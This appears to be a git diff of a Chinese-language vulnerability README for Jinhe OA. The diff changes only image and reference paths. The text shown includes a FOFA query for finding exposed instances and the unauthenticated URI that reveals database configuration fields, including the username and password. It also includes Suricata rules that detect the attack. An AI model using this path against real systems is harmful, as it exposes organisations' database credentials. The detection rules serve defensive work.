@@ -7,7 +7,7 @@
 ### 指纹识别  
 fofa: app="金和网络-金和OA"  
 
-![Image text](https://github.com/YUUKI4O4/POC/blob/main/Jinhe_OA_SAP_B1Config_unauthorized/1.png)
+![Image text](https://github.com/YUUKI4O4/POC/blob/main/%E9%87%91%E5%92%8C/Jinhe_OA_SAP_B1Config_unauthorized/1.png)
 
 ### 漏洞利用  
 ```
@@ -15,7 +15,7 @@ poc:
 /C6/JHsoft.CostEAI/SAP_B1Config.aspx/?manage=1
 ```
 
-![Image text](https://github.com/YUUKI4O4/POC/blob/main/Jinhe_OA_SAP_B1Config_unauthorized/2.png)
+![Image text](https://github.com/YUUKI4O4/POC/blob/main/%E9%87%91%E5%92%8C/Jinhe_OA_SAP_B1Config_unauthorized/2.png)
 
 ### 测试和利用脚本  
 ```
@@ -39,6 +39,6 @@ options:
 
 ### Suricata rules  
 ```
-alert http any any -> any any (msg:"Jinhe OA SAP_ B1Config.aspx has an unauthorized access vulnerability"; flow:established,to_server; flowbits:set,Jinhe_OA_SAP_B1Config_unauthorized;noalert; content:"get";http_method;nocase; content:"/C6/JHsoft.CostEAI/SAP_B1Config.aspx/?manage=1";http_uri;fast_pattern;nocase; reference:url,https://github.com/YUUKI4O4/POC/tree/main/Jinhe_OA_SAP_B1Config_unauthorized; classtype:web-attck; metadata:created_at 2024-1-8,updated_at 2024-1-8,creater:YUUKI4O4; sid:7; rev:1;)
-alert http any any -> any any (msg:"Jinhe OA SAP_ B1Config.aspx has an unauthorized access vulnerability successfully"; flow:established,from_server; flowbits:isset,Jinhe_OA_SAP_B1Config_unauthorized; content:"200";http_stat_code; content:"txtDatabaseServer";nocase;http_server_body; content:"txtLicenseServer";nocase;http_server_body; content:"txtDatabaseName";nocase;http_server_body; content:"ddlDatabaseType";nocase;http_server_body; content:"txtUserName";nocase;http_server_body; content:"txtUserPassword";nocase;http_server_body; reference:url,https://github.com/YUUKI4O4/POC/tree/main/Jinhe_OA_SAP_B1Config_unauthorized; classtype:web-attck; metadata:created_at 2024-1-8,updated_at 2024-1-8,creater:YUUKI4O4; sid:8; rev:1;)
+alert http any any -> any any (msg:"Jinhe OA SAP_ B1Config.aspx has an unauthorized access vulnerability"; flow:established,to_server; flowbits:set,Jinhe_OA_SAP_B1Config_unauthorized;noalert; content:"get";http_method;nocase; content:"/C6/JHsoft.CostEAI/SAP_B1Config.aspx/?manage=1";http_uri;fast_pattern;nocase; reference:url,https://github.com/YUUKI4O4/POC/tree/main/%E9%87%91%E5%92%8C/Jinhe_OA_SAP_B1Config_unauthorized; classtype:web-attck; metadata:created_at 2024-1-8,updated_at 2024-1-8,creater:YUUKI4O4; sid:7; rev:1;)
+alert http any any -> any any (msg:"Jinhe OA SAP_ B1Config.aspx has an unauthorized access vulnerability successfully"; flow:established,from_server; flowbits:isset,Jinhe_OA_SAP_B1Config_unauthorized; content:"200";http_stat_code; content:"txtDatabaseServer";nocase;http_server_body; content:"txtLicenseServer";nocase;http_server_body; content:"txtDatabaseName";nocase;http_server_body; content:"ddlDatabaseType";nocase;http_server_body; content:"txtUserName";nocase;http_server_body; content:"txtUserPassword";nocase;http_server_body; reference:url,https://github.com/YUUKI4O4/POC/tree/main/%E9%87%91%E5%92%8C/Jinhe_OA_SAP_B1Config_unauthorized; classtype:web-attck; metadata:created_at 2024-1-8,updated_at 2024-1-8,creater:YUUKI4O4; sid:8; rev:1;)
 ```
